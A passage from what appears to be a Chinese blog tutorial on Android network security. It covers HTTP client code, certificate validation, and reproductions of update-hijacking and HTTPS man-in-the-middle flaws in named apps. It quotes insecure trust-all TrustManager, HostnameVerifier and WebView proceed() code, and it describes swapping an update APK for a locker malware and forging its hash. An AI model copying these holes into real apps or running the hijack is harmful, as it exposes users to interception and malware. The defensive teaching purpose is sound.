<span class="operator">=</span> (HttpURLConnection) url.openConnection();</span><br></pre></td></tr></table></figure><p>设置HTTP请求使用的方法，<code>GET</code>表示希望从服务器那里获取数据，<code>POST</code>表示提交数据给服务器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">connection.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">或者</span><br><span class="line">connection.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br></pre></td></tr></table></figure><p>再就是一些自由定制，如设置连接超时、读取超时的毫秒数、服务器的一些消息头等</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">connection.setRequestProperty(<span class="string">&quot;token&quot;</span>,<span class="string">&quot;wwanghai&quot;</span>);<span class="comment">//设置请求参数</span></span><br><span class="line">connection.setConnectTimeout(<span class="number">8000</span>);<span class="comment">//设置连接超时时间</span></span><br><span class="line">connection.setReadTimeout(<span class="number">8000</span>);<span class="comment">//设置接收超时时间</span></span><br></pre></td></tr></table></figure><p>调用getInputStream()方法获取服务器返回的输入流</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> connection.getInputStream();</span><br></pre></td></tr></table></figure><p>我们可以用字节数组保存读取的数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">bufferSize</span> <span class="operator">=</span> <span class="number">1024</span>;</span><br><span class="line"><span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[bufferSize];</span><br><span class="line"><span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line"><span class="keyword">while</span> (in.read(buffer)!=-<span class="number">1</span>)&#123;</span><br><span class="line">     sb.append(<span class="keyword">new</span> <span class="title class_">String</span>(buffer));</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>最后调用disconnect()方法将HTTP连接关闭掉</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connection.disconnect();</span><br></pre></td></tr></table></figure><h4 id="（2）okhttp3"><a href="#（2）okhttp3" class="headerlink" title="（2）okhttp3"></a>（2）okhttp3</h4><p>okHttp的项目主页地址是：<a href="https://github.com/square/okhttp">okHttp</a></p><p>我们需要在项目中添加依赖，编辑app&#x2F;build.gradle文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implementation(<span class="string">&quot;com.squareup.okhttp3:okhttp:3.12.0&quot;</span>)</span><br></pre></td></tr></table></figure><p>首先创建一个OkHttpClient的实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>();</span><br><span class="line">或者加一些设置</span><br><span class="line"><span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>.Builder()</span><br><span class="line">                                        .readTimeout(<span class="number">5</span>, TimeUnit.SECONDS)  <span class="comment">//设置读超时</span></span><br><span class="line">                                        .writeTimeout(<span class="number">5</span>, TimeUnit.SECONDS)  <span class="comment">//设置写超时</span></span><br><span class="line">                                        .connectTimeout(<span class="number">15</span>,TimeUnit.SECONDS) <span class="comment">//设置连接超时</span></span><br><span class="line">                                        .retryOnConnectionFailure(<span class="literal">true</span>) <span class="comment">//是否自动重连</span></span><br><span class="line">                                        .build();</span><br></pre></td></tr></table></figure><p>如果要发起HTTP请求，就需要创建一个Request对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder().build(); <span class="comment">//这是一个空的对象</span></span><br><span class="line">    实际使用中</span><br><span class="line">    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">                                  .url(<span class="string">&quot;http://www,baidu.com&quot;</span>)</span><br><span class="line">                                  .header(<span class="string">&quot;token&quot;</span>,<span class="string">&quot;wanghai&quot;</span>)</span><br><span class="line">                                  .build();</span><br><span class="line">POST：</span><br><span class="line">    <span class="comment">//需要先构建一个RequestBody来存放待提交的参数，然后再传入Request</span></span><br><span class="line">    <span class="type">RequestBody</span> <span class="variable">requestBody</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FormBody</span>.Builder()</span><br><span class="line">                                            .add(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;damin&quot;</span>)</span><br><span class="line">                                            .add(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">                                            .build();</span><br><span class="line"><span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">                                  .url(<span class="string">&quot;http://www,baidu.com&quot;</span>)</span><br><span class="line">                                  .post(requestBody)</span><br><span class="line">                                  .build();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调用OkHttpClient的newCall()方法来创建一个Call对象，并调用execute()方法来发送请求并获取服务器返回的数据，response对象就是服务器返回的数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> client.newCall(request).execute();</span><br><span class="line"><span class="type">String</span> <span class="variable">responseData</span> <span class="operator">=</span> response.body().string();</span><br></pre></td></tr></table></figure><p>还可以使用异步方式来获取数据，Android中大部分都使用异步方式来获取数据，通过enqueue（）函数产生一次真实的网络请求，通过onResponse（）函数进行回调</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">client.newCall(request).enqueue(<span class="keyword">new</span> <span class="title class_">Callback</span>() &#123;</span><br><span class="line">               <span class="meta">@Override</span></span><br><span class="line">               <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onFailure</span><span class="params">(Call call, IOException e)</span> &#123;</span><br><span class="line">                   call.cancel();</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               <span class="meta">@Override</span></span><br><span class="line">               <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onResponse</span><span class="params">(Call call, Response response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                   <span class="type">String</span> <span class="variable">responseData</span> <span class="operator">=</span> response.body().string();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br></pre></td></tr></table></figure><h4 id="（3）各自证书的校验方式"><a href="#（3）各自证书的校验方式" class="headerlink" title="（3）各自证书的校验方式"></a>（3）各自证书的校验方式</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）根据 app 内置证书 KeyStore 生成 TrustManager 验证</span><br><span class="line">（<span class="number">2</span>）自定义 SSLSocketFactory(org.apache.http.conn.ssl.SSLSocketFactory)实现 TrustManager 验证策略(httpClient)</span><br><span class="line">（<span class="number">3</span>）自定义SSLSocketFactory(javax.net.ssl.SSLSocketFactory)实现TrustManager 验证策略(HttpsURLConnection,OkHttp3)</span><br><span class="line">（<span class="number">4</span>）自定义的 HostnameVerifier 和 X509TrustManager 实现验证</span><br><span class="line">（<span class="number">5</span>）第三方库中的验证，如 OkHttp3 中的 CertificatePinner(证书锁定)</span><br><span class="line">（<span class="number">6</span>）WebView 加载 Https 页面时证书校验出错，停止加载</span><br></pre></td></tr></table></figure><p>下面是比较常见的实现https类的各自证书校验方式：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/30.png" alt="image-20211205163031752"></p><p>下面是证书验证的一些关系示意图，参考链接：<a href="https://docs.oracle.com/javase/6/docs/technotes/guides/security/jsse/JSSERefGuide.html">证书关系</a></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/31.png" alt="image-20211205163311496"></p><p>上图中要进行 SSL 会话，必须先建立一个 SSLSocket 对象，而 SSLSocket 对象是通过 SSLSocketFactory 来管理的，SSLSocketFactory 对象则依赖于 SSLContext ，SSLContext 对象的初始化需要 keyManager、TrustManager 和 SecureRandom。TrustManager 对象是我们后文比较关心的，因为正是 TrustManager 负责证书的校验，对网站进行认证，要想确保数据不被中间人抓包分析，就需要实现这个类进行验证，以保障数据的安全性</p><p>在整个过程中 TrustManager 类专门负责校验证书，可以改写 TrustManager 类，实现对证书对校验或让它不要对证书做校验</p><h2 id="三、HTTP-x2F-HTTPs漏洞分析和复现"><a href="#三、HTTP-x2F-HTTPs漏洞分析和复现" class="headerlink" title="三、HTTP&#x2F;HTTPs漏洞分析和复现"></a>三、HTTP&#x2F;HTTPs漏洞分析和复现</h2><h3 id="1-漏洞的安全种类和危害"><a href="#1-漏洞的安全种类和危害" class="headerlink" title="1.漏洞的安全种类和危害"></a>1.漏洞的安全种类和危害</h3><p>Andoid的网络通信中一般采用http明文传输，或使用SSL&#x2F;TLS协议的https密文传输，对于http明文传输来说自然会导致很多漏洞，例如信息泄露漏洞，升级劫持漏洞，验证码口令泄露漏洞等等，而使用https传输的明文，也存在大量的HTTPs证书不校验漏洞，中间人攻击漏洞等等</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/14.png" alt="image-20211205145836325"></p><h3 id="2-HTTP明文传输漏洞"><a href="#2-HTTP明文传输漏洞" class="headerlink" title="2.HTTP明文传输漏洞"></a>2.HTTP明文传输漏洞</h3><h4 id="（1）漏洞案例"><a href="#（1）漏洞案例" class="headerlink" title="（1）漏洞案例"></a>（1）漏洞案例</h4><h5 id="lt-1-gt-酷我音乐APP存在逻辑缺陷漏洞"><a href="#lt-1-gt-酷我音乐APP存在逻辑缺陷漏洞" class="headerlink" title="&lt;1&gt;酷我音乐APP存在逻辑缺陷漏洞"></a>&lt;1&gt;酷我音乐APP存在逻辑缺陷漏洞</h5><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-45684">酷我音乐APP存在逻辑缺陷漏洞</a></p><p>漏洞原理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">酷我音乐APP采用http明文传输，攻击者可以通过利用该漏洞利用代理工具篡改数据包来升级校验，从而导致APP升级过程中恶意软件注入攻击</span><br></pre></td></tr></table></figure><p>漏洞复现：</p><p>我们点击检测新版本，可以抓取对应的响应请求，其中下面的是下载请求</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/15.png" alt="image-20211205145836325"></p><p>然后，我们可以发现程序下载完成后，显示正常的升级界面</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/16.png" alt="image-20211205150811779"></p><p>我们可以知道这条请求就是程序的下载请求，对应的就是下载的apk，我们尝试劫持这条请求，将apk替换成我们的恶意锁机程序</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/17.png" alt="image-20211205150811779"></p><p>下劫持响应请求断点，可以让我们在请求响应前劫持</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/18.png" alt="image-20211205150811779"></p><p>通过HFS文件管理服务器，来模拟请求的服务器</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/19.png" alt="image-20211205150811779"></p><p>注意路径应与apk下载请求url保持一致，域名设置为我们本机的ip地址</p><p>重新安装，开始升级</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/20.png" alt="image-20211205150811779"></p><p>然后升级手机被恶意软件劫持</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/21.png" alt="image-20211205150811779"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/22.png" alt="image-20211205150811779"></p><h5 id="lt-2-gt-上海任意门科技有限公司Soul-APP存在信息泄露漏洞"><a href="#lt-2-gt-上海任意门科技有限公司Soul-APP存在信息泄露漏洞" class="headerlink" title="&lt;2&gt; 上海任意门科技有限公司Soul APP存在信息泄露漏洞"></a>&lt;2&gt; 上海任意门科技有限公司Soul APP存在信息泄露漏洞</h5><p><a href="https://www.cnvd.org.cn/user/myreport/4827046">上海任意门科技有限公司Soul APP存在信息泄露漏洞</a></p><p>信息泄露原理很简单就是利用http明文传输，导致一些账户信息、登录信息的泄露，具体大家可以拿一个http传输的样本去测试，然后自己去查看一些信息问题</p><h5 id="lt-3-gt-酷狗直播存在逻辑缺陷漏洞（hash验证）"><a href="#lt-3-gt-酷狗直播存在逻辑缺陷漏洞（hash验证）" class="headerlink" title="&lt;3&gt;酷狗直播存在逻辑缺陷漏洞（hash验证）"></a>&lt;3&gt;酷狗直播存在逻辑缺陷漏洞（hash验证）</h5><p><a href="https://www.cnvd.org.cn/flaw/show/4050696">酷狗直播存在逻辑缺陷漏洞（hash验证）</a></p><p>考虑到http明文传输的危害后，一些厂商开始加入hash验证，这也是我们前面讲述过的验证Android应用的完整性，因为每一个Android APP仅拥有唯一的hash值，但是这种我们可以在升级时，同时去替换相应的hash值来达到升级劫持漏洞的过程</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/23.png" alt="image-20211205150811779"></p><p>我们可以发现在一些厂商的报文中会包含hash值验证，所以如果我们直接去注入恶意程序，我们的应用是安装不上去，但是我们对对应的报文进行替换hash值，替换成我们对于的恶意程序的hash值，我们就可以成功的复现上述升级劫持漏洞的过程</p><h4 id="（2）漏洞防护"><a href="#（2）漏洞防护" class="headerlink" title="（2）漏洞防护"></a>（2）漏洞防护</h4><p>通过上面分析，我们发现上述的漏洞都是因为厂家的APP在传输过程中采用了明文传输导致的，因此防护措施：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）HTTPs加密传输</span><br><span class="line">（<span class="number">2</span>）本地hash验证</span><br></pre></td></tr></table></figure><h3 id="3-HTTPs密文传输漏洞"><a href="#3-HTTPs密文传输漏洞" class="headerlink" title="3.HTTPs密文传输漏洞"></a>3.HTTPs密文传输漏洞</h3><h4 id="（1）漏洞案例-1"><a href="#（1）漏洞案例-1" class="headerlink" title="（1）漏洞案例"></a>（1）漏洞案例</h4><h5 id="lt-1-gt-忽略SSL证书校验漏洞"><a href="#lt-1-gt-忽略SSL证书校验漏洞" class="headerlink" title="&lt;1&gt; 忽略SSL证书校验漏洞"></a>&lt;1&gt; 忽略SSL证书校验漏洞</h5><p>漏洞原理：</p><p>在自定义实现X509TrustManager时，checkServerTrusted中没有检查证书是否可信，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。由于客户端没有校验服务端的证书，因此攻击者就能与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容</p><p>目标程序代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyX509TrustManager</span> <span class="keyword">implements</span> <span class="title class_">X509TrustManager</span> &#123;  </span><br><span class="line"><span class="comment">// 检查客户端证书  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkClientTrusted</span><span class="params">(X509Certificate[] chain, String authType)</span> <span class="keyword">throws</span> CertificateException &#123; </span><br><span class="line">    <span class="comment">//没有校验的话，就代表接收任意的证书</span></span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 检查服务器端证书  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkServerTrusted</span><span class="params">(X509Certificate[] chain, String authType)</span> <span class="keyword">throws</span> CertificateException &#123;  </span><br><span class="line">    <span class="comment">//没有校验的话，就代表接收任意的证书</span></span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 返回受信任的X509证书数组  </span></span><br><span class="line"><span class="keyword">public</span> X509Certificate[] getAcceptedIssuers() &#123;  </span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>在重写WebViewClient的onReceivedSslError方法时，调用proceed忽略证书验证错误信息继续加载页面，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害</p><p>目标程序代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mywebview.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebviewClient</span>()&#123;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Override</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceivedError</span><span class="params">(WebView view,<span class="type">int</span> errorCode,String description,String falingUrl)</span>&#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// TODO Auto generated method stub  </span></span><br><span class="line">    <span class="built_in">super</span>.onReceivedError(view,errorCode,description,fallingUrl) ;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Override</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceivedSslError</span><span class="params">(WebView view,SslErrorHandler handler,SslError error)</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// T0D0 Auto-generated method stub  </span></span><br><span class="line">    handler.proceed( );  <span class="comment">//不对证书进行处理</span></span><br><span class="line">&#125;;  </span><br><span class="line">&#125;);  </span><br></pre></td></tr></table></figure><p><strong>案例一：京东金融MITM漏洞</strong></p><p>漏洞原理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">京东金融Ver 2.8.0由于证书校验有缺陷，导致https中间人攻击，攻击者直接可以获取到会话中敏感数据的加密秘钥，另外由于APP没有做应用加固或混淆，因此可以轻松分析出解密算法，利用获取到的key解密敏感数据</span><br></pre></td></tr></table></figure><p>登录后捕获的数据：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/24.png" alt="image-20211205150811779"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/25.png" alt="image-20211205150811779"></p><p>安全防护：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）建议自定义实现X509TrustManager时，checkServerTrusted中对服务器信息进行严格校验。  </span><br><span class="line">（<span class="number">2</span>）针对自定义TrustManager,检查checkServerTrusted()函数是否为空实现。  </span><br><span class="line">（<span class="number">3</span>）建议不要重写TrustManager 和HostnameVerifier,使用系统默认的。  </span><br><span class="line">（<span class="number">4</span>）在重写WebViewClient的onReceivedSslError方法时，避免调用proceed忽略证书验证。  </span><br><span class="line">（<span class="number">5</span>）禁止使用proceed()函数忽略证书错误，应该抛给系统进行安全警告</span><br></pre></td></tr></table></figure><p>例如，我们在相应的地方加上校验：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/26.png" alt="image-20211205154720291"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/28.png" alt="image-20211205154828588"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/27.png" alt="image-20211205154751251"></p><h5 id="lt-2-gt-忽略域名校验漏洞"><a href="#lt-2-gt-忽略域名校验漏洞" class="headerlink" title="&lt;2&gt;忽略域名校验漏洞"></a>&lt;2&gt;忽略域名校验漏洞</h5><p>在自定义实现HostnameVerifier时，没有在verify中进行严格证书校验，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害</p><p>目标代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HostnameVerifier</span> <span class="variable">hv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HostnameVerifier</span> ()&#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(String hostname,SSLSession session)</span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>在setHostnameVerifier方法中使用ALLOW_ALL_HOSTNAME _VERIFIER,信任所有Hostname,导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害</p><p>目标代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> HttpClient <span class="title function_">getNewHttpClient</span><span class="params">()</span> &#123;  </span><br><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line">    <span class="type">KeyStore</span> <span class="variable">trustStore</span> <span class="operator">=</span> KeyStore.getInstance(KeyStore  </span><br><span class="line">    .getDefaultType());  </span><br><span class="line">    trustStore.load(<span class="literal">null</span>, <span class="literal">null</span>);  </span><br><span class="line">    <span class="type">SSLSocketFactory</span> <span class="variable">sf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SSLSocketFactory</span>(trustStore);  </span><br><span class="line">    sf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);  <span class="comment">//这里信任了所以的hostname，导致可能存在中间人攻击</span></span><br><span class="line">    <span class="type">HttpParams</span> <span class="variable">params</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BasicHttpParams</span>();  </span><br><span class="line">    HttpProtocolParams.setVersion(params, HttpVersion.HTTP_1_1);  </span><br><span class="line">    HttpProtocolParams.setContentCharset(params, HTTP.UTF_8);  </span><br><span class="line">    <span class="type">SchemeRegistry</span> <span class="variable">registry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SchemeRegistry</span>();  </span><br><span class="line">    registry.register(<span class="keyword">new</span> <span class="title class_">Scheme</span>(<span class="string">&quot;http&quot;</span>, PlainSocketFactory  </span><br><span class="line">    .getSocketFactory(), <span class="number">80</span>));  </span><br><span class="line">    registry.register(<span class="keyword">new</span> <span class="title class_">Scheme</span>(<span class="string">&quot;https&quot;</span>, sf, <span class="number">443</span>));  </span><br><span class="line">    <span class="type">ClientConnectionManager</span> <span class="variable">ccm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadSafeClientConnManager</span>(  </span><br><span class="line">    params, registry);  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DefaultHttpClient</span>(ccm, params);  </span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DefaultHttpClient</span>();  </span><br><span class="line">&#125;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>案例二：<a href="https://www.cnvd.org.cn/flaw/show/4069106">WPS存在信息泄漏漏洞</a></strong></p><p>WPS采用HTTPs进行通信但是由于证书校验问题，可以被获取到敏感信息，从而导致信息泄漏漏洞，这里和上面一致，就不再重新演示了</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/29.png" alt="image-20211205155437510"></p><p>安全防护：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）在自定义实现HostnameVerifier时，在verify中对Hostname进行严格校验</span><br><span class="line">（2）建议setHostnameVerifier方法中使用STRICT_HOSTNAME_VERIFIER进行严格证书校验，避免使用ALLOW_ALL_HOSTNAME_VERIFIER</span><br></pre></td></tr></table></figure><h5 id="lt-3-gt-作业帮存在https升级劫持漏洞"><a href="#lt-3-gt-作业帮存在https升级劫持漏洞" class="headerlink" title="&lt;3&gt;作业帮存在https升级劫持漏洞"></a>&lt;3&gt;作业帮存在https升级劫持漏洞</h5><p>大家都知道https是采用加密方式来进行通信，一般来说除非证书的设置方面存在漏洞，否则很难直接去截获报文信息，但是在我挖掘漏洞的过程中，发现一个新的思路，可能这是很多厂商比较懒的原因，直接升级https后，传输的报文数据还是原来的数据，所以我们可以选择采用http旧版本的APP，抓取明文信息，修改后，使用于新版的信息，也可以导致劫持的漏洞</p><p>当然这个过程中也需要解决接收方证书信任的问题，还需要模拟https的请求方式，这里可以使用<a href="https://bbs.pediy.com/thread-268459.htm">stunnel配置</a>，这里主要提供一种思路，其他操作步骤和上述一直，就不再重复演示了</p><h4 id="（2）漏洞防护-1"><a href="#（2）漏洞防护-1" class="headerlink" title="（2）漏洞防护"></a>（2）漏洞防护</h4><p>针对于Android https的开发过程中常见的安全缺陷：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)在自定义实现X509TrustManager时，checkServerTrusted中没有检查证书是否可信，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。</span><br><span class="line"><span class="number">2</span>)在重写WebViewClient的onReceivedSslError方法时，调用proceed忽略证书验证错误信息继续加载页面，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。</span><br><span class="line"><span class="number">3</span>)在自定义实现HostnameVerifier时，没有在verify中进行严格证书校验，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。</span><br><span class="line"><span class="number">4</span>)在setHostnameVerifier方法中使用ALLOW_ALL_HOSTNAME_VERIFIER，信任所有Hostname，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。</span><br></pre></td></tr></table></figure><h2 id="四、Android-绕过https的SSL-Pining"><a href="#四、Android-绕过https的SSL-Pining" class="headerlink" title="四、Android 绕过https的SSL Pining"></a>四、Android 绕过https的SSL Pining</h2><p>我们在对Android APP抓包时，经常会出现HTTPS报文通过MITM代理后不被信任的问题，有些https在设置好证书后，会出现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unknown</span><br><span class="line">加密的乱码</span><br><span class="line">报错无法抓包</span><br></pre></td></tr></table></figure><p>这是因为对方的https采用了 SSL pinning</p><h3 id="1-SSL-pinning"><a href="#1-SSL-pinning" class="headerlink" title="1.SSL pinning"></a>1.SSL pinning</h3><p>SSL pining &#x3D; 证书绑定 &#x3D; SSL证书绑定</p><p>表示对方的app只允许承认自己特定的证书，这导致MITM的证书不被识别，不运行，从而导致MITM无法解密看到https的明文数据</p><h3 id="2-Android-7-0后破解https-的ssl-pinning"><a 